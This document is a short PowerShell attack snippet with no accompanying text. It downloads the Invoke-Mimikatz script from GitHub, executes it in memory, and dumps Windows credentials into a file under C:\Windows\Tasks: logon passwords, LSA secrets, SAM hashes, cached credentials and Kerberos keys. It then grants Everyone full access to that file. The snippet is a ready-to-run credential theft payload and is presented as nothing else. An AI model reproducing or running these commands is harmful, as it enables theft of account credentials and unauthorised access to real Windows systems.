IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Gather/Invoke-Mimikatz.ps1');
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"' >> C:\Windows\Tasks\mraow.txt;
echo Y| icacls c:\windows\tasks\mraow.txt /grant Everyone:F;
